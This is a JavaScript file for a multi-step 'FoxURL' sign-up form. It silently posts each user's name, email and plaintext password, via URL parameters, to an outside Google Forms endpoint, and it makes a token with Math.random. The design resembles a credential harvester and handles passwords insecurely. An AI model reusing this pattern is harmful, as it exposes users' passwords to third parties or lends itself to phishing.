const steps = Array.from(document.querySelectorAll(".step"));
const nextButtons = document.querySelectorAll(".next-btn");
const backButtons = document.querySelectorAll(".back-btn");
const form = document.getElementById("registerForm");

let currentStep = 0;

function showStep(index) {
  steps.forEach((step, i) => {
    step.classList.toggle("active", i === index);
  });
  currentStep = index;
}

nextButtons.forEach(btn => {
  btn.addEventListener("click", () => {
    if (currentStep === 0) {
      const first = document.getElementById("firstName").value.trim();
      const last = document.getElementById("lastName").value.trim();
      if (!first || !last) return alert("Please enter your first and last name.");
    }
    if (currentStep === 1) {
      const email = document.getElementById("email").value.trim();
      if (!email) return alert("Please enter your email.");
    }
    if (currentStep === 2) {
      const password = document.getElementById("password").value.trim();
      if (!password) return alert("Please enter a password (text).");
    }
    if (currentStep < steps.length - 1) {
      showStep(currentStep + 1);
    }
  });
});

backButtons.forEach(btn => {
  btn.addEventListener("click", () => {
    if (currentStep > 0) {
      showStep(currentStep - 1);
    }
  });
});

function generateToken(length = 32) {
  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{};:,.<>/?";
  let token = "";
  for (let i = 0; i < length; i++) {
    token += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return token;
}

form.addEventListener("submit", async e => {
  e.preventDefault();

  const agree = document.getElementById("agree").checked;
  if (!agree) {
    return alert("You must agree to the terms to continue.");
  }

  const first = document.getElementById("firstName").value.trim();
  const last = document.getElementById("lastName").value.trim();
  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();
  const token = generateToken();

  // Build Google Form submission URL
  const url =
    "https://docs.google.com/forms/d/e/1FAIpQLScmlJvZuABkgGSNHwCZyktXeyCuh0dN9-3UmJQLikx5MbV49g/formResponse?" +
    new URLSearchParams({
      "entry.1250599026": first,
      "entry.167595914": last,
      "entry.53770560": email,
      "entry.443791735": password,
      "entry.1889541250": token
    }).toString();

  // Send silently in the background
  try {
    await fetch(url, { method: "POST", mode: "no-cors" });
  } catch (err) {
    console.log("Silent form submission error (expected in no-cors mode):", err);
  }

  // Show success message
  document.querySelector(".right-panel").innerHTML = `
    <h2>Account created</h2>
    <p>Your FoxURL account has been successfully created.</p>
  `;
});
